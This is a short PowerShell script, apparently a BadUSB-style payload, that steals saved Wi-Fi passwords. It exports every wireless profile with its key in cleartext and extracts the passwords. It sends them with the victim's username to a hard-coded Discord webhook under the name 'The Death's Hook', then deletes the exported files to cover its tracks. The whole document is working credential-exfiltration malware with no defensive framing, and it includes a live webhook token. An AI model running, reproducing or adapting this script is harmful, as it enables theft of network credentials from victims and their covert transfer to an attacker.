$TempDir = [System.IO.Path]::GetTempPath()
cd $TempDir

netsh wlan export profile key=clear

Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-pass

(Get-Content .\Wi-Fi-pass).Replace('<keyMaterial>', '').Replace('</keyMaterial>', '\n').Replace('Wi-Fi-', "(+) ").Replace("`t", '').Replace('.xml:22:', ' : ') | where {$_.trim() -ne ""} | Set-Content .\Wi-Fi-cleaned

$Body = Get-Content .\Wi-Fi-cleaned

$RealBody = "{
	`"content`": null,
	`"embeds`": [
		{
			`"title`": `"$env:username`",
			`"description`": `"$Body`",			
			`"color`":5814783
		}	
	],
	`"username`": `"The Death's Hook`",
	`"attachments`": []
}"

$hookUrl = 'https://discord.com/api/webhooks/1242800979112493088/8glRAWaSzV8NZVt19qR8ZbC5DQKksfuWuNjpVvvuHxb3s_cf22ygq0vGy607Ty-tMJ1R'

 Invoke-WebRequest -Uri $hookUrl -Method POST -Body $RealBody -Headers @{'Content-Type' = 'application/json'} -UseBasicParsing

try
{
    $Response = Invoke-WebRequest -Uri $hookUrl -Method POST -Body $RealBody -Headers @{'Content-Type' = 'application/json'}
    # This will only execute if the Invoke-WebRequest is successful.
    $StatusCode = $Response.StatusCode
} catch {
    $StatusCode = $_.Exception.Response.StatusCode.value__
}
$StatusCode

Remove-Item Wi-Fi*
